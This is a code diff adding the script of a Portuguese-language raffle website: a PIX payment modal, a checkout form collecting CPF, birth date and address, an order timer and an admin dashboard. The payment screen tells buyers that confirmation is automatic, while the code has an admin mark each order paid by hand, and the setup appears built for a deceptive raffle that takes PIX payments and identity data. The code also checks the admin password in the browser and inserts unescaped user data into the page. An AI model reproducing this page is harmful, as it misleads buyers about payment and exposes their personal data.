+                    <div class="pix-key">${CONFIG.pixKey}</div>
+                    <button class="btn-copy" onclick="copyPix()"><i class="bi bi-copy"></i> Copiar código PIX</button>
+                </div>
+                <div style="text-align:left; color:#888; font-size:13px; line-height:1.8;">
+                    <p><i class="bi bi-2-circle-fill" style="color:#00307a;"></i> Abra o app do seu banco e escolha a opção PIX, como se fosse fazer uma transferência.</p>
+                    <p><i class="bi bi-3-circle-fill" style="color:#00307a;"></i> Selecione a opção PIX cópia e cola, cole a chave copiada e confirme o pagamento.</p>
+                    <p class="warning">Este pagamento só pode ser realizado dentro do tempo, após este período, caso o pagamento não for confirmado os números voltam a ficar disponíveis.</p>
+                    <p class="success">🔗 A confirmação é automática. O botão será liberado em alguns segundos.</p>
+                </div>
+                <div style="text-align:center; margin:16px 0;">
+                    <div style="display:flex; align-items:center; justify-content:center; gap:10px; color:#00307a; font-size:18px;">
+                        <i class="bi bi-arrow-repeat fa-spin"></i> <span>Aguarde...</span>
+                    </div>
+                    <div style="color:#888; font-size:13px;">🔑 Aguarde até 5 minutos para a confirmação.</div>
+                </div>
+                <div style="border-top:1px solid #eee; padding-top:16px; margin-top:8px; text-align:center;">
+                    <div style="color:#888; font-size:12px;">Adquira já!</div>
+                    <div style="color:#00307a; font-weight:700; font-size:14px;"># GIROS_LTPUMMILHAO_002/600</div>
+                    <div style="color:#888; font-size:14px;">EDIÇÃO 600 - JETSKI + VW/SAVEIRO 2027</div>
+                    <button class="btn-secondary" onclick="closeModal()" style="margin-top:8px;"><i class="bi bi-house"></i> Voltar ao início</button>
+                </div>
+            `;
+            startTimer(10 * 60);
+        }
+    }
+
+    function goToData() {
+        const phone = document.getElementById('phoneInput').value.trim();
+        if (!phone) { alert('Informe seu telefone.'); return; }
+        showStep('data');
+        setTimeout(() => {
+            document.getElementById('cellphone').value = phone;
+            document.getElementById('confirmCell').value = phone;
+        }, 50);
+    }
+
+    function toggleAddress() {
+        document.getElementById('addressFields').style.display = document.getElementById('addressCheck').checked ? 'block' : 'none';
+    }
+
+    function finalizeOrder() {
+        const name = document.getElementById('fullName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const cell = document.getElementById('cellphone').value.trim();
+        const confirmCell = document.getElementById('confirmCell').value.trim();
+        const birth = document.getElementById('birthDate').value;
+        const cpf = document.getElementById('cpf').value.trim();
+        const terms = document.getElementById('termsCheck').checked;
+
+        if (!name || !email || !cell || !confirmCell || !birth || !cpf) { alert('Preencha todos os campos obrigatórios.'); return; }
+        if (cell !== confirmCell) { alert('Os números de celular não coincidem.'); return; }
+        if (!terms) { alert('Você deve concordar com os termos.'); return; }
+
+        const order = {
+            id: Date.now().toString(36) + Math.random().toString(36).substr(2,5),
+            campanha: currentCampanha.titulo,
+            numbers: selectedNumbers,
+            qty: selectedNumbers.length,
+            total: (selectedNumbers.length * currentCampanha.valor).toFixed(2),
+            clientName: name,
+            clientEmail: email,
+            clientPhone: cell,
+            birthDate: birth,
+            cpf: cpf,
+            address: document.getElementById('addressCheck').checked ? {
+                cep: document.getElementById('cep').value,
+                street: document.getElementById('street').value,
+                number: document.getElementById('number').value,
+                complement: document.getElementById('complement').value,
+                neighborhood: document.getElementById('neighborhood').value,
+                city: document.getElementById('city').value,
+                state: document.getElementById('state').value
+            } : null,
+            status: 'aguardando_pagamento',
+            createdAt: new Date().toISOString(),
+            expiresAt: new Date(Date.now() + 10 * 60 * 1000).toISOString()
+        };
+        saveOrder(order);
+        currentOrderId = order.id;
+        showStep('payment');
+    }
+
+    // ===== TIMER =====
+    function startTimer(totalSeconds) {
+        let remaining = totalSeconds;
+        updateTimerDisplay(remaining);
+        if (timerInterval) clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+            remaining--;
+            updateTimerDisplay(remaining);
+            if (remaining <= 0) {
+                clearInterval(timerInterval);
+                if (currentOrderId) { updateOrderStatus(currentOrderId, 'expirado'); alert('⏰ Tempo esgotado! O pedido foi cancelado.'); }
+                document.getElementById('timerDisplay').innerText = '00:00';
+                document.getElementById('timerLabel').innerText = '00:00';
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay(seconds) {
+        const mins = Math.floor(seconds/60), secs = seconds%60;
+        const str = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+        const td = document.getElementById('timerDisplay'), tl = document.getElementById('timerLabel');
+        if (td) td.innerText = str;
+        if (tl) tl.innerText = str;
+    }
+
+    function copyPix() {
+        navigator.clipboard.writeText(CONFIG.pixKey).then(() => alert('Código PIX copiado!'))
+            .catch(() => { const ta = document.createElement('textarea'); ta.value = CONFIG.pixKey; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); alert('Código PIX copiado!'); });
+    }
+
+    // ===== MODAL CONTROLS =====
+    function closeModal() { document.getElementById('modalCheckout').classList.remove('active'); if (timerInterval) clearInterval(timerInterval); selectedNumbers = []; currentOrderId = null; }
+    function showAdminLogin() { document.getElementById('modalAdmin').classList.add('active'); document.getElementById('adminError').innerText = ''; document.getElementById('adminPass').value = ''; }
+    function closeAdmin() { document.getElementById('modalAdmin').classList.remove('active'); }
+    function closeDashboard() { document.getElementById('modalDashboard').classList.remove('active'); }
+
+    // ===== ADMIN =====
+    function adminLogin() {
+        const pass = document.getElementById('adminPass').value;
+        if (pass === CONFIG.adminPassword) { closeAdmin(); document.getElementById('modalDashboard').classList.add('active'); renderDashboard(); }
+        else { document.getElementById('adminError').innerText = '❌ Senha incorreta.'; }
+    }
+    function logoutAdmin() { closeDashboard(); }
+
+    function renderDashboard() {
+        const container = document.getElementById('ordersList');
+        const orders = getOrders();
+        if (orders.length === 0) { container.innerHTML = '<p style="color:#888;">Nenhum pedido cadastrado.</p>'; return; }
+        orders.sort((a,b) => new Date(b.createdAt) - new Date(a.createdAt));
+        let html = '';
+        orders.forEach(order => {
+            const statusMap = {
+                'aguardando_pagamento': { label:'⏳ Aguardando pagamento', cls:'pending' },
+                'pago_aguardando_liberacao': { label:'💰 Pago - Aguardando liberação', cls:'pending' },
+                'liberado': { label:'✅ Liberado', cls:'confirmed' },
+                'cancelado': { label:'❌ Cancelado', cls:'cancelled' },
+                'expirado': { label:'⏰ Expirado', cls:'cancelled' }
+            };
+            const st = statusMap[order.status] || statusMap['aguardando_pagamento'];
+            const numbersStr = order.numbers ? order.numbers.join(', ') : 'N/A';
+            html += `
+                <div style="background:#f8f8f8; padding:12px; border-radius:12px; margin-bottom:10px; border-left:4px solid #00307a;">
+                    <div style="display:flex; flex-wrap:wrap; gap:6px 12px; align-items:center;">
+                        <strong style="color:#00307a;">#${order.id.slice(0,8)}</strong>
+                        <span style="color:#171717;">${order.clientName}</span>
+                        <span style="color:#888; font-size:13px;">${order.clientPhone}</span>
+                        <span style="font-weight:700; font-size:11px; padding:2px 12px; border-radius:30px; background:${st.cls === 'confirmed' ? '#4caf50' : st.cls === 'cancelled' ? '#f44336' : '#ff9800'}; color:#fff; text-transform:uppercase;">${st.label}</span>
+                    </div>
+                    <div style="font-size:13px; color:#555;">Cotas: <strong style="color:#00307a;">${numbersStr}</strong> (${order.qty} un) • R$ ${order.total}</div>
+                    <div style="font-size:11px; color:#999;">${new Date(order.createdAt).toLocaleString()} ${order.expiresAt ? ` • Expira: ${new Date(order.expiresAt).toLocaleString()}` : ''}</div>
+                    <div style="display:flex; gap:6px; flex-wrap:wrap; margin-top:6px;">
+                        ${order.status === 'aguardando_pagamento' ? `<button onclick="marcarPago('${order.id}')" style="background:#ff9800; border:none; color:#fff; padding:4px 14px; border-radius:30px; font-weight:600; font-size:12px; cursor:pointer;">💰 Marcar pago</button>` : ''}
+                        ${order.status === 'pago_aguardando_liberacao' ? `<button onclick="liberarNumeros('${order.id}')" style="background:#4caf50; border:none; color:#fff; padding:4px 14px; border-radius:30px; font-weight:600; font-size:12px; cursor:pointer;">✅ Liberar</button>` : ''}
+                        ${order.status === 'liberado' ? `<a href="https://wa.me/55${order.clientPhone.replace(/\D/g,'')}?text=Olá ${order.clientName}! Suas cotas *${order.numbers.join(', ')}* foram liberadas! 🎉" target="_blank" style="background:#25d366; color:#fff; padding:4px 14px; border-radius:30px; font-weight:600; font-size:12px; text-decoration:none; display:inline-block;">📱 Zap</a>` : ''}
+                        ${order.status !== 'liberado' && order.status !== 'cancelado' && order.status !== 'expirado' ? `<button onclick="cancelarPedido('${order.id}')" style="background:#f44336; border:none; color:#fff; padding:4px 14px; border-radius:30px; font-weight:600; font-size:12px; cursor:pointer;">❌</button>` : ''}
+                    </div>
+                </div>
+            `;
+        });
+        container.innerHTML = html;
+    }
+
+    // ===== ORDERS (localStorage) =====
+    function getOrders() { const data = localStorage.getItem('orders'); return data ? JSON.parse(data) : []; }
+    function saveOrder(order) { const orders = getOrders(); orders.push(order); localStorage.setItem('orders', JSON.stringify(orders)); }
+    function updateOrderStatus(orderId, newStatus) {
+        const orders = getOrders();
+        const idx = orders.findIndex(o => o.id === orderId);
+        if (idx !== -1) { orders[idx].status = newStatus; localStorage.setItem('orders', JSON.stringify(orders)); return true; }
+        return false;
+    }
+    function marcarPago(orderId) { if (!confirm('Marcar este pedido como PAGO?')) return; if (updateOrderStatus(orderId, 'pago_aguardando_liberacao')) renderDashboard(); }
+    function liberarNumeros(orderId) { if (!confirm('Confirmar liberação dos números?')) return; if (updateOrderStatus(orderId, 'liberado')) renderDashboard(); }
+    function cancelarPedido(orderId) { if (!confirm('Cancelar este pedido?')) return; if (updateOrderStatus(orderId, 'cancelado')) renderDashboard(); }
+
+    // ===== RENDER CAMPANHAS =====
+    function renderCampanhas() {
+        const container = document.getElementById('campanhasList');
+        let html = '';
+        campanhas.forEach(c => {
+            // Para cada campanha, exibe os botões de pacotes
+            html += `
+                <div class="card-sorteio-mini">
+                    <img class="img-mini" src="${c.img}" alt="${c.titulo}">
+                    <div class="info-mini">
+                        <span class="badge-status ${c.classe}">${c.status}</span>
+                        <div class="codigo">${c.codigo}</div>
+                        <div class="titulo">${c.titulo}</div>
+                        <div class="desc">${c.descricao}</div>
+                        <div class="pacotes-mini">
+                            <button class="pqt-btn-mini" onclick="event.stopPropagation(); startCheckout('${c.id}','${c.titulo}',${c.valor},10000,20)">+20</button>
+                            <button class="pqt-btn-mini" onclick="event.stopPropagation(); startCheckout('${c.id}','${c.titulo}',${c.valor},10000,30)">+30</button>
+                            <button class="pqt-btn-mini" onclick="event.stopPropagation(); startCheckout('${c.id}','${c.titulo}',${c.valor},10000,50)">+50</button>
+                            <button class="pqt-btn-mini" onclick="event.stopPropagation(); startCheckout('${c.id}','${c.titulo}',${c.valor},10000,70)">+70</button>
+                            <button class="pqt-btn-mini" onclick="event.stopPropagation(); startCheckout('${c.id}','${c.titulo}',${c.valor},10000,100)">+100</button>
+                        </div>
+                    </div>
+                </div>
+            `;
+        });
+        container.innerHTML = html;
+    }
+
+    // ===== RENDER FAQ =====
+    function renderFaq() {
+        const container = document.getElementById('faqContainer');
+        let html = '';
+        faqs.forEach(f => {
+            html += `
+                <div class="faq-item">
+                    <div class="question" onclick="toggleFaq(this)">
+                        <span>${f.pergunta}</span>
+                        <i class="bi bi-chevron-right"></i>
+                    </div>
+                    <div class="answer">${f.resposta}</div>
+                </div>
+            `;
+        });
+        container.innerHTML = html;
+    }
+
+    function toggleFaq(el) {
+        const answer = el.parentElement.querySelector('.answer');
+        const icon = el.querySelector('i');
+        answer.classList.toggle('open');
+        el.classList.toggle('open');
+        icon.classList.toggle('bi-chevron-right');
+        icon.classList.toggle('bi-chevron-down');
+    }
+
+    // ===== MENU =====
+    function toggleMenu() { alert('Menu: Campanhas | Meus títulos'); }
+
+    // ===== INIT =====
+    renderCampanhas();
+    renderFaq();
+</script>
+</body>
+</html>
